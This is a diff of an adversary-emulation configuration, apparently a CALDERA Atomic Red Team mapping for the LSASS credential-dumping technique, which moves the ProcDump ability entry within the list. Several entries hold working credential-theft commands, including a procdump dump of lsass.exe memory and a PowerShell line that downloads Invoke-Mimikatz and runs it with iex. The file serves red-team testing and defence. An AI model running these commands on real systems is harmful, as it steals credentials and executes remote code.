@@ -8,14 +8,6 @@
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "abilities": [
           {
-            "ability_id": "3ae905fe6171f9d0fbefd9cb6b8d6a82",
-            "name": "Dump LSASS.exe Memory using ProcDump",
-            "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
-            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
-            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe\"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://download.sysinternals.com/files/Procdump.zip\" -O /tmp/Procdump.zip && \\\nunzip -o /tmp/Procdump.zip -d /tmp/Procdump && \\\ncp /tmp/Procdump/procdump64.exe $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe && \\\nrm -rf /tmp/Procdump.zip /tmp/Procdump && \\\nsudo systemctl restart caldera; fi",
-            "win_prereq": ""
-          },
-          {
             "ability_id": "82dcefb5c3512d73bf2248cb0127c4ae",
             "name": "Powershell Mimikatz",
             "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n",
@@ -133,6 +125,14 @@
             "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
             "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds",
             "kali_prereq": "",
+            "win_prereq": ""
+          },
+          {
+            "ability_id": "3ae905fe6171f9d0fbefd9cb6b8d6a82",
+            "name": "Dump LSASS.exe Memory using ProcDump",
+            "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
+            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
+            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe\"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://download.sysinternals.com/files/Procdump.zip\" -O /tmp/Procdump.zip && \\\nunzip -o /tmp/Procdump.zip -d /tmp/Procdump && \\\ncp /tmp/Procdump/procdump64.exe $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe && \\\nrm -rf /tmp/Procdump.zip /tmp/Procdump && \\\nsudo systemctl restart caldera; fi",
             "win_prereq": ""
           }
         ]
